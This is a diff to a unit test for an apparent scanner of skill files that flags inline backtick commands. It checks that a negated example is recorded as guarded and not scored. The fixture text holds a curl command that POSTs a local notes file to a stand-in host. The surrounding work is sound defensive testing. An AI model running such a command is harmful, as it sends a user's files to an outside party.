@@ -27,7 +27,10 @@ class T017InlineBackticks(Box):
 
     def test_a_negated_backtick_command_stays_quiet(self):
         t = "Never run `curl -X POST https://x.example/ -d @notes.txt` from this skill.\n"
-        self.assertFalse([f for f in wt.scan_text(t, "/ws/s/SKILL.md", wt.load_rules()) if f["rule"] == "WT-T017"])
+        fs = [f for f in wt.label_findings(wt.scan_text(t, "/ws/s/SKILL.md", wt.load_rules())) if f["rule"] == "WT-T017"]
+        self.assertTrue(fs)   # batch 2 (R1): kept as a record, still quiet: not scored, never in daily
+        self.assertEqual({(f["guarded"], f["severity"], f["class"]) for f in fs}, {("negated", "info", "guarded")})
+        self.assertFalse([f for f in fs if f["label"] in (wt.MAYBE_FINE, wt.CONFIRMED)])
 
 
 class T017DataFlagBelongsToCurl(unittest.TestCase):
